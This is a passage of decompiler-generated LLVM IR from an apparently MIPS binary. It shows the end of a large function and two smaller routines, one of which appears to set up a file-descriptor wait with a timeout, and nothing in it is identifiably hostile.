  %stack_var_-64.2 = phi i32 [ %stack_var_-64.1, %dec_label_pc_403228 ], [ %stack_var_-64.0, %dec_label_pc_403180 ], [ %stack_var_-64.0, %dec_label_pc_4030fc ], [ %stack_var_-64.0, %dec_label_pc_403054 ], [ %stack_var_-64.1, %dec_label_pc_4037d0 ], [ %stack_var_-64.1, %dec_label_pc_403abc ], [ %stack_var_-64.1, %dec_label_pc_403840 ], [ %stack_var_-64.1, %dec_label_pc_403768 ]
  %stack_var_-56.4 = phi i32 [ %stack_var_-56.3, %dec_label_pc_403228 ], [ %stack_var_-56.2, %dec_label_pc_403180 ], [ %stack_var_-56.2, %dec_label_pc_4030fc ], [ %stack_var_-56.2, %dec_label_pc_403054 ], [ %stack_var_-56.3, %dec_label_pc_4037d0 ], [ %stack_var_-56.3, %dec_label_pc_403abc ], [ %stack_var_-56.3, %dec_label_pc_403840 ], [ %stack_var_-56.3, %dec_label_pc_403768 ]
  %stack_var_-52.4 = phi i32 [ %stack_var_-52.3, %dec_label_pc_403228 ], [ %stack_var_-52.2, %dec_label_pc_403180 ], [ %stack_var_-52.2, %dec_label_pc_4030fc ], [ %stack_var_-52.2, %dec_label_pc_403054 ], [ %stack_var_-52.3, %dec_label_pc_4037d0 ], [ %stack_var_-52.3, %dec_label_pc_403abc ], [ %stack_var_-52.3, %dec_label_pc_403840 ], [ %stack_var_-52.3, %dec_label_pc_403768 ]
  %v0_403ba4 = load i32, i32* @s2, align 4
  store i32 %v0_403ba4, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403ba8

dec_label_pc_403ba8:                              ; preds = %dec_label_pc_40372c, %dec_label_pc_403580, %dec_label_pc_403ba4
  %v0_403bb844 = phi i32 [ %v0_403ba4, %dec_label_pc_403ba4 ], [ %v2_403674, %dec_label_pc_403580 ], [ %v2_403764, %dec_label_pc_40372c ]
  %stack_var_-64.3 = phi i32 [ %stack_var_-64.2, %dec_label_pc_403ba4 ], [ %stack_var_-64.1, %dec_label_pc_403580 ], [ %stack_var_-64.1, %dec_label_pc_40372c ]
  %stack_var_-56.5 = phi i32 [ %stack_var_-56.4, %dec_label_pc_403ba4 ], [ %stack_var_-56.3, %dec_label_pc_403580 ], [ %stack_var_-56.3, %dec_label_pc_40372c ]
  %stack_var_-52.5 = phi i32 [ %stack_var_-52.4, %dec_label_pc_403ba4 ], [ %stack_var_-52.3, %dec_label_pc_403580 ], [ %stack_var_-52.3, %dec_label_pc_40372c ]
  br label %dec_label_pc_403bb8

dec_label_pc_403bb8:                              ; preds = %dec_label_pc_403abc.dec_label_pc_403bb8_crit_edge, %dec_label_pc_403ba8
  %v0_403bb8 = phi i32 [ %v0_403bb844, %dec_label_pc_403ba8 ], [ %v0_403bb8.pre, %dec_label_pc_403abc.dec_label_pc_403bb8_crit_edge ]
  %stack_var_-64.4 = phi i32 [ %stack_var_-64.3, %dec_label_pc_403ba8 ], [ %stack_var_-64.1, %dec_label_pc_403abc.dec_label_pc_403bb8_crit_edge ]
  %stack_var_-56.6 = phi i32 [ %stack_var_-56.5, %dec_label_pc_403ba8 ], [ %stack_var_-56.3, %dec_label_pc_403abc.dec_label_pc_403bb8_crit_edge ]
  %stack_var_-52.6 = phi i32 [ %stack_var_-52.5, %dec_label_pc_403ba8 ], [ %stack_var_-52.3, %dec_label_pc_403abc.dec_label_pc_403bb8_crit_edge ]
  store i32 %v0_403bb8, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403bbc

dec_label_pc_403bbc:                              ; preds = %dec_label_pc_403678, %dec_label_pc_403bb8
  %v0_403bcc = phi i32 [ %v0_403bb8, %dec_label_pc_403bb8 ], [ %v2_403674, %dec_label_pc_403678 ]
  %stack_var_-64.5 = phi i32 [ %stack_var_-64.4, %dec_label_pc_403bb8 ], [ %stack_var_-64.1, %dec_label_pc_403678 ]
  %stack_var_-56.7 = phi i32 [ %stack_var_-56.6, %dec_label_pc_403bb8 ], [ %stack_var_-56.3, %dec_label_pc_403678 ]
  %stack_var_-52.7 = phi i32 [ %stack_var_-52.6, %dec_label_pc_403bb8 ], [ %stack_var_-52.3, %dec_label_pc_403678 ]
  %v1_403bc0 = add i32 %v1_402868, 291184
  %v2_403bc0 = inttoptr i32 %v1_403bc0 to i32*
  store i32 %v0_403bcc, i32* %a0.global-to-local, align 4
  %v3_403bd4 = load i32, i32* %v2_403bc0, align 4
  %v1_403bdc = add i32 %v3_403bd4, 10208
  call void @__pseudo_call(i32 %v1_403bdc)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403bec

dec_label_pc_403bec:                              ; preds = %dec_label_pc_403694, %dec_label_pc_402fc8, %dec_label_pc_402dd0, %dec_label_pc_403bbc
  %stack_var_-64.6 = phi i32 [ %stack_var_-64.5, %dec_label_pc_403bbc ], [ %stack_var_-64.0, %dec_label_pc_402dd0 ], [ %stack_var_-64.0, %dec_label_pc_402fc8 ], [ %stack_var_-64.1, %dec_label_pc_403694 ]
  %stack_var_-56.8 = phi i32 [ %stack_var_-56.7, %dec_label_pc_403bbc ], [ %stack_var_-56.2, %dec_label_pc_402dd0 ], [ %stack_var_-56.2, %dec_label_pc_402fc8 ], [ %stack_var_-56.3, %dec_label_pc_403694 ]
  %stack_var_-52.8 = phi i32 [ %stack_var_-52.7, %dec_label_pc_403bbc ], [ %stack_var_-52.2, %dec_label_pc_402dd0 ], [ %stack_var_-52.2, %dec_label_pc_402fc8 ], [ %stack_var_-52.3, %dec_label_pc_403694 ]
  %v0_403bf0 = load i32, i32* @s2, align 4
  %v1_403bf0 = add i32 %v0_403bf0, 1048
  store i32 %v1_403bf0, i32* @s2, align 4
  %v1_403bf4 = add i32 %stack_var_-64.6, 1
  store i32 %v1_403bf4, i32* %v1.global-to-local, align 4
  %v1_403c04 = load i32, i32* @s7, align 4
  %v2_403c04 = icmp slt i32 %v1_403bf4, %v1_403c04
  %v3_403c04 = zext i1 %v2_403c04 to i32
  store i32 %v3_403c04, i32* %v0.global-to-local, align 4
  br i1 %v2_403c04, label %dec_label_pc_402dd0, label %dec_label_pc_403c18

dec_label_pc_403c18:                              ; preds = %dec_label_pc_402860.dec_label_pc_403c18_crit_edge, %dec_label_pc_403bec, %dec_label_pc_4028bc
  %v4_403c40 = phi i32 [ %v4_403c40.pre, %dec_label_pc_402860.dec_label_pc_403c18_crit_edge ], [ %v3_403c04, %dec_label_pc_403bec ], [ -1, %dec_label_pc_4028bc ]
  store i32 %v0_402890, i32* @s1, align 4
  store i32 %v0_402894, i32* @s0, align 4
  ret i32 %v4_403c40

; uselistorder directives
  uselistorder i32 %v1_403bf4, { 1, 2, 0 }
  uselistorder i32 %v1_403bf0, { 1, 0 }
  uselistorder i32 %v2_403ad0.pre-phi, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v2_4037e0.pre-phi, { 4, 1, 2, 3, 18, 16, 17, 14, 15, 13, 12, 10, 11, 8, 9, 7, 0, 6, 5 }
  uselistorder i32 %v0_403700, { 1, 2, 0, 3 }
  uselistorder i32 %v3_4034f8, { 1, 2, 0 }
  uselistorder i32 %v0_4034f8, { 1, 2, 3, 0 }
  uselistorder i32 %v1_4034c8, { 1, 0 }
  uselistorder i32 %v0_403414, { 1, 0 }
  uselistorder i8* %v7_403444, { 0, 6, 1, 5, 2, 3, 4, 7, 10, 8, 9, 11 }
  uselistorder i32 %v2_40341c, { 0, 1, 3, 2, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23 }
  uselistorder i32 %v0_4033e0, { 1, 0, 2 }
  uselistorder i32 %v3_4033c4, { 0, 2, 1 }
  uselistorder i32 %v6_4033b0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_40337c, { 1, 0, 2 }
  uselistorder i32 %v1_403314, { 1, 0 }
  uselistorder i32 %v0_403300, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v0_4032b4, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-52.3, { 0, 5, 9, 2, 6, 1, 7, 8, 10, 11, 3, 4 }
  uselistorder i32 %stack_var_-56.3, { 0, 3, 9, 2, 4, 1, 5, 8, 10, 11, 6, 7 }
  uselistorder i32 %stack_var_-64.1, { 0, 3, 7, 2, 4, 1, 5, 6, 8, 9 }
  uselistorder i32 %v3_4031d8, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_4030a4, { 1, 0, 2 }
  uselistorder i32 %v1_403098, { 1, 2, 0 }
  uselistorder i32 %v5_40309c, { 1, 0, 2 }
  uselistorder i32 %v0_402fc8, { 1, 0 }
  uselistorder i32 %v1_402f48, { 1, 0 }
  uselistorder i32 %v1_402f2c, { 1, 0 }
  uselistorder i32 %v0_402f14, { 1, 0, 2, 3 }
  uselistorder i32 %v0_402ecc, { 2, 3, 4, 6, 5, 7, 9, 8, 0, 10, 1, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 %v1_402ec4, { 1, 0 }
  uselistorder i32 %v3_402ddc, { 1, 0 }
  uselistorder i32 %stack_var_-52.2, { 6, 7, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %stack_var_-56.2, { 6, 7, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %stack_var_-64.0, { 6, 7, 3, 4, 5, 0, 1, 2 }
  uselistorder i32 %v2_402cf8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v2_402c60, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_402c40, { 1, 0, 2, 3 }
  uselistorder i32 %v2_402c08, { 1, 0, 3, 2, 4, 5 }
  uselistorder i8* %v7_402af4, { 3, 0, 1, 4, 2, 5, 6 }
  uselistorder i32 %v1_4029c8, { 1, 0 }
  uselistorder i32 %v2_4029b0, { 1, 0, 2 }
  uselistorder i32 %v1_402944, { 2, 1, 0 }
  uselistorder i32 %., { 0, 1, 3, 2 }
  uselistorder i32 %v2_402868, { 7, 33, 32, 31, 30, 29, 28, 27, 26, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 25, 24, 23, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 22, 6, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 88, 0, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 120, 119, 118, 117, 116, 115, 114, 113, 112, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 87, 86, 5, 4, 3, 2, 1, 121 }
  uselistorder i32 %v1_402868, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-1092, { 4, 5, 6, 7, 8, 9, 3, 11, 0, 1, 2, 12, 10, 13 }
  uselistorder i32* %stack_var_-2116, { 1, 0, 2, 3 }
  uselistorder i32* %stack_var_-2312, { 2, 0, 1 }
  uselistorder i32* %stack_var_-2336, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-2332, { 2, 0, 1 }
  uselistorder i8* %stack_var_-2320, { 2, 0, 1 }
  uselistorder i32 %tmp77, { 0, 2, 1 }
  uselistorder i32 %tmp76, { 0, 2, 1 }
  uselistorder i32* %v1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 32, 33, 34, 35, 36, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31 }
  uselistorder i32* %v0.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26, 27, 28, 29, 30, 32, 31, 34, 33, 35, 36, 38, 37, 39, 41, 40, 42, 44, 43, 45, 46, 51, 47, 48, 49, 50, 52, 54, 53, 55, 57, 56, 58, 145, 144, 146, 147, 148, 149, 151, 150, 152, 153, 59, 2, 60, 1, 61, 62, 64, 63, 65, 66, 0, 72, 67, 68, 69, 70, 71, 73, 74, 75, 100, 77, 76, 78, 79, 81, 80, 83, 82, 84, 86, 85, 87, 88, 89, 91, 90, 92, 94, 93, 95, 96, 97, 98, 99, 101, 102, 103, 104, 105, 106, 107, 108, 110, 109, 111, 112, 113, 115, 114, 117, 116, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 133, 132, 134, 135, 136, 137, 138, 139, 143, 140, 141, 142 }
  uselistorder i32* %s4.global-to-local, { 3, 4, 5, 6, 7, 8, 0, 1, 2 }
  uselistorder i32* %s3.global-to-local, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32* %s1.global-to-local, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 17, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22 }
  uselistorder i32* %s0.global-to-local, { 0, 1, 2, 3, 19, 20, 21, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 52, 107, 53, 54, 55, 56, 57, 58, 59, 60, 61, 67, 62, 63, 64, 65, 66, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 94, 85, 86, 87, 88, 89, 90, 91, 92, 93, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 108, 109, 110, 111, 112, 113 }
  uselistorder i32* %a0.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 2, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 63, 64, 65, 66, 67, 69, 1, 68, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 0 }
  uselistorder i32 (i32)* @function_400418, { 4, 3, 2, 1, 0 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_408af0.161 to i32*), { 1, 2, 0 }
  uselistorder i32 ptrtoint ([11 x i8]* @global_var_4086f0.152 to i32), { 0, 2, 1, 3 }
  uselistorder i32 16384, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 17, 11, 12, 18, 13, 19, 14, 15, 16 }
  uselistorder i32 (i32, i32, i32)* @function_405cb0, { 1, 0 }
  uselistorder i32 65535, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @function_405110, { 2, 1, 0 }
  uselistorder i32 11, { 0, 5, 2, 6, 3, 7, 8, 4, 1 }
  uselistorder i32 192, { 1, 2, 0, 3 }
  uselistorder i8 1, { 3, 4, 5, 2, 1, 0 }
  uselistorder i32 17, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 0, 1 }
  uselistorder i16 0, { 4, 0, 1, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @function_404acc, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_4068f0, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_403f6c, { 10, 9, 8, 7, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32* @s3, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9 }
  uselistorder i32 1024, { 1, 10, 2, 11, 3, 12, 4, 13, 5, 14, 6, 15, 7, 16, 8, 0, 9, 17 }
  uselistorder i32 ()* @function_403e84, { 23, 22, 21, 20, 19, 18, 17, 16, 5, 4, 3, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 2, 1 }
  uselistorder i32 (i32)* @function_401ef4, { 1, 0 }
  uselistorder i32 (i32)* @function_400564, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 30, { 0, 3, 1, 4, 2 }
  uselistorder i32 29, { 1, 3, 2, 4, 0 }
  uselistorder i32 27, { 1, 3, 2, 4, 0 }
  uselistorder i32 (i32)* @function_4002d0, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 2054, { 1, 0, 2 }
  uselistorder i32 1048, { 1, 2, 0 }
  uselistorder i32 ()* @function_401e44, { 1, 0 }
  uselistorder i32 ()* @function_404d80, { 1, 0 }
  uselistorder i32* @s6, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_403c18, { 1, 2, 0 }
  uselistorder label %dec_label_pc_403bec, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_403bbc, { 1, 0 }
  uselistorder label %dec_label_pc_403bb8, { 1, 0 }
  uselistorder label %dec_label_pc_403ba8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_403ba4, { 0, 3, 4, 5, 6, 7, 1, 2 }
  uselistorder label %dec_label_pc_403abc, { 1, 0 }
  uselistorder label %dec_label_pc_403aac, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_4038e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4037d0, { 1, 0 }
  uselistorder label %dec_label_pc_40372c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_403310, { 1, 0 }
  uselistorder label %dec_label_pc_403228, { 2, 1, 0 }
  uselistorder label %dec_label_pc_4031e8, { 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_4031d8.thread, { 1, 0 }
  uselistorder label %dec_label_pc_4031c4.thread, { 1, 0 }
  uselistorder label %dec_label_pc_403188, { 1, 0 }
  uselistorder label %dec_label_pc_403080, { 1, 0 }
  uselistorder label %dec_label_pc_402fc8, { 1, 0 }
  uselistorder label %dec_label_pc_402fac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_402f4c, { 1, 0 }
  uselistorder label %dec_label_pc_402f3c, { 1, 0 }
  uselistorder label %dec_label_pc_402f30, { 1, 0 }
  uselistorder label %dec_label_pc_402e30, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10 }
  uselistorder label %dec_label_pc_402d84, { 1, 0 }
  uselistorder label %dec_label_pc_402ce8, { 1, 0 }
  uselistorder label %dec_label_pc_402cd8, { 1, 0 }
  uselistorder label %dec_label_pc_402bd4, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_402958, { 1, 0 }
}

define i32 @function_403c48() local_unnamed_addr {
dec_label_pc_403c48:
  %v3_403c54 = load i32, i32* bitcast (i32** @global_var_449bcc.167 to i32*), align 4
  %v3_403c58 = load i32, i32* @global_var_449ba0.75, align 4
  store i32 %v3_403c58, i32* @t9, align 4
  %v3_403c60 = call i32 @function_404f50(i32 %v3_403c54, i32 9)
  ret i32 %v3_403c60
}

define i32 @function_403c68(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403c68:
  %gp.global-to-local = alloca i32, align 4
  %s1.global-to-local = alloca i32, align 4
  %s2.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp11 = alloca i32, align 4
  %tmp12 = alloca i32, align 4
  %tmp13 = alloca i32, align 4
  %tmp14 = alloca i32, align 4
  %v1_403c70 = load i32, i32* @t9, align 4
  %v2_403c70 = add i32 %v1_403c70, 318792
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v3_403c90 = load i32, i32* @global_var_449b50.97, align 4
  store i32 %arg1, i32* %s2.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403c90)
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v0_403ca4 = load i32, i32* @v0, align 4
  store i32 %v0_403ca4, i32* %v1.global-to-local, align 4
  %v3_403ca8 = load i32, i32* bitcast (i32** @global_var_449bcc.167 to i32*), align 4
  %v2_403cb0 = inttoptr i32 %v3_403ca8 to i32*
  store i32 %v0_403ca4, i32* %v2_403cb0, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_403cb8 = load i32, i32* %v1.global-to-local, align 4
  %v2_403cb8 = icmp eq i32 %v0_403cb8, -1
  %v1_403cc0 = icmp sgt i32 %v0_403cb8, 0
  %or.cond = or i1 %v2_403cb8, %v1_403cc0
  br i1 %or.cond, label %dec_label_pc_403e68, label %dec_label_pc_403cc4

dec_label_pc_403cc4:                              ; preds = %dec_label_pc_403c68
  %v3_403cc8 = load i32, i32* @global_var_449b78.96, align 4
  call void @__pseudo_call(i32 %v3_403cc8)
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v2_403ce0 = ptrtoint i32* %tmp11 to i32
  %v2_403ce8 = ptrtoint i32* %tmp12 to i32
  %v2_403dc0 = ptrtoint i32* %tmp13 to i32
  %v2_403d38 = ptrtoint i32* %tmp14 to i32
  br label %dec_label_pc_403cdc

dec_label_pc_403cdc:                              ; preds = %dec_label_pc_403d08, %dec_label_pc_403cc4
  store i32 16, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403ce0

dec_label_pc_403ce0:                              ; preds = %dec_label_pc_403dbc, %dec_label_pc_403cdc
  store i32 16, i32* %tmp13, align 4
  store i32 %v2_403ce8, i32* %v1.global-to-local, align 4
  store i32 %v2_403ce0, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403cf0

dec_label_pc_403cf0:                              ; preds = %dec_label_pc_403cf0, %dec_label_pc_403ce0
  %v0_403cf0 = phi i32 [ %v1_403cf4, %dec_label_pc_403cf0 ], [ %v2_403ce0, %dec_label_pc_403ce0 ]
  %v1_403cf0 = inttoptr i32 %v0_403cf0 to i32*
  store i32 0, i32* %v1_403cf0, align 4
  %v0_403cf4 = load i32, i32* %v0.global-to-local, align 4
  %v1_403cf4 = add i32 %v0_403cf4, 4
  store i32 %v1_403cf4, i32* %v0.global-to-local, align 4
  %v1_403cf8 = load i32, i32* %v1.global-to-local, align 4
  %v2_403cf8 = icmp eq i32 %v1_403cf4, %v1_403cf8
  br i1 %v2_403cf8, label %dec_label_pc_403cfc, label %dec_label_pc_403cf0

dec_label_pc_403cfc:                              ; preds = %dec_label_pc_403cf0
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_403d04 = load i32, i32* %s2.global-to-local, align 4
  %v2_403d04 = icmp eq i32 %v0_403d04, -1
  %v4_403d04 = udiv i32 %v0_403d04, 32
  store i32 %v4_403d04, i32* %s1.global-to-local, align 4
  br i1 %v2_403d04, label %dec_label_pc_403cfc.dec_label_pc_403d6c_crit_edge, label %dec_label_pc_403d08

dec_label_pc_403cfc.dec_label_pc_403d6c_crit_edge: ; preds = %dec_label_pc_403cfc
  %v0_403d6c.pre = load i32, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403d6c

dec_label_pc_403d08:                              ; preds = %dec_label_pc_403cfc
  store i32 %v2_403dc0, i32* %v0.global-to-local, align 4
  %v1_403d10 = mul nuw nsw i32 %v4_403d04, 4
  %v2_403d14 = add i32 %v1_403d10, %v2_403dc0
  %v1_403d18 = add i32 %v2_403d14, 28
  %v2_403d18 = inttoptr i32 %v1_403d18 to i32*
  %v3_403d18 = load i32, i32* %v2_403d18, align 4
  %v1_403d1c = urem i32 %v0_403d04, 32
  store i32 %v1_403d1c, i32* @s0, align 4
  %v2_403d24 = shl i32 1, %v1_403d1c
  %v2_403d28 = or i32 %v3_403d18, %v2_403d24
  store i32 %v2_403d28, i32* %v1.global-to-local, align 4
  store i32 10, i32* %v0.global-to-local, align 4
  %v0_403d30 = load i32, i32* %gp.global-to-local, align 4
  %v1_403d30 = add i32 %v0_403d30, -32192
  %v2_403d30 = inttoptr i32 %v1_403d30 to i32*
  %v3_403d30 = load i32, i32* %v2_403d30, align 4
  store i32 10, i32* %tmp14, align 4
  store i32 %v2_403d38, i32* %v0.global-to-local, align 4
  store i32 %v2_403d28, i32* %v2_403d18, align 4
  store i32 0, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_403d30)
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v0_403d5c = load i32, i32* %v0.global-to-local, align 4
  %v1_403d5c = icmp eq i32 %v0_403d5c, 0
  store i32 %v2_403d38, i32* %v1.global-to-local, align 4
  br i1 %v1_403d5c, label %dec_label_pc_403cdc, label %dec_label_pc_403d60

dec_label_pc_403d60:                              ; preds = %dec_label_pc_403d08
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403d6c

dec_label_pc_403d6c:                              ; preds = %dec_label_pc_403cfc.dec_label_pc_403d6c_crit_edge, %dec_label_pc_403d60
  %v0_403d6c = phi i32 [ %v0_403d6c.pre, %dec_label_pc_403cfc.dec_label_pc_403d6c_crit_edge ], [ %v2_403c70, %dec_label_pc_403d60 ]
  %v1_403d6c = add i32 %v0_403d6c, -32236
  %v2_403d6c = inttoptr i32 %v1_403d6c to i32*
  %v3_403d6c = load i32, i32* %v2_403d6c, align 4
  call void @__pseudo_call(i32 %v3_403d6c)
  %v0_403d84 = load i32, i32* %v0.global-to-local, align 4
  %v2_403d84 = zext i32 %v0_403d84 to i64
  %v4_403d84 = mul nuw i64 %v2_403d84, 3435973837
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v3_403d90 = load i32, i32* @global_var_449c00.77, align 4
  %v1_403d981 = udiv i64 %v4_403d84, 17179869184
  %v1_403d98 = trunc i64 %v1_403d981 to i32
  store i32 %v1_403d98, i32* %v1.global-to-local, align 4
  %v1_403d9c3 = mul nuw nsw i64 %v1_403d981, 4
  %v1_403d9c = trunc i64 %v1_403d9c3 to i32
  %v2_403da0.neg = sub i32 %v0_403d84, %v1_403d98
  %v2_403da4 = sub i32 %v2_403da0.neg, %v1_403d9c
  store i32 %v2_403da4, i32* %v0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_403d90)
  %v0_403db8 = load i32, i32* %v1.global-to-local, align 4
  %v2_403db8 = icmp eq i32 %v0_403db8, %v2_403da4
  %v3_403db8 = load i32, i32* %s1.global-to-local, align 4
  %v4_403db8 = mul i32 %v3_403db8, 4
  store i32 %v4_403db8, i32* %v0.global-to-local, align 4
  br i1 %v2_403db8, label %dec_label_pc_403e58, label %dec_label_pc_403dbc

dec_label_pc_403dbc:                              ; preds = %dec_label_pc_403d6c
  %v2_403dc4 = add i32 %v4_403db8, %v2_403dc0
  store i32 %v2_403dc4, i32* %v0.global-to-local, align 4
  %v1_403dc8 = add i32 %v2_403dc4, 28
  %v2_403dc8 = inttoptr i32 %v1_403dc8 to i32*
  %v3_403dc8 = load i32, i32* %v2_403dc8, align 4
  %v1_403dd0 = load i32, i32* @s0, align 4
  %tmp17 = shl i32 1, %v1_403dd0
  %v1_403dd46 = and i32 %tmp17, %v3_403dc8
  %v1_403dd8 = icmp eq i32 %v1_403dd46, 0
  store i32 16, i32* %v0.global-to-local, align 4
  br i1 %v1_403dd8, label %dec_label_pc_403ce0, label %dec_label_pc_403ddc

dec_label_pc_403ddc:                              ; preds = %dec_label_pc_403dbc
  %v3_403de0 = load i32, i32* @global_var_449bbc.169, align 4
  call void @__pseudo_call(i32 %v3_403de0)
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v3_403df8 = load i32, i32* @global_var_449ae8.170, align 4
  call void @__pseudo_call(i32 %v3_403df8)
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v3_403e10 = load i32, i32* @global_var_449aec.171, align 4
  call void @__pseudo_call(i32 %v3_403e10)
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v3_403e28 = load i32, i32* @global_var_449a98.172, align 4
  call void @__pseudo_call(i32 %v3_403e28)
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  %v3_403e40 = load i32, i32* @global_var_449ba0.75, align 4
  call void @__pseudo_call(i32 %v3_403e40)
  store i32 %v2_403c70, i32* %gp.global-to-local, align 4
  br label %dec_label_pc_403e58

dec_label_pc_403e58:                              ; preds = %dec_label_pc_403d6c, %dec_label_pc_403ddc
  %v3_403e58 = load i32, i32* @global_var_449ab8.95, align 4
  call void @__pseudo_call(i32 %v3_403e58)
  %v4_403e7c.pre = load i32, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_403e68

dec_label_pc_403e68:                              ; preds = %dec_label_pc_403c68, %dec_label_pc_403e58
  %v4_403e7c = phi i32 [ -1, %dec_label_pc_403c68 ], [ %v4_403e7c.pre, %dec_label_pc_403e58 ]
  ret i32 %v4_403e7c

; uselistorder directives
  uselistorder i32 %v4_403db8, { 1, 0 }
  uselistorder i32 %v1_403d1c, { 1, 0 }
  uselistorder i32 %v1_403cf4, { 1, 2, 0 }
  uselistorder i32 %v2_403c70, { 9, 7, 8, 5, 6, 4, 0, 3, 2, 1, 10 }
  uselistorder i32* %tmp14, { 1, 0 }
  uselistorder i32* %tmp13, { 1, 0 }
  uselistorder i32* %v0.global-to-local, { 2, 3, 0, 1, 4, 10, 5, 6, 7, 8, 9, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %gp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11 }
  uselistorder i64 4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_403e68, { 1, 0 }
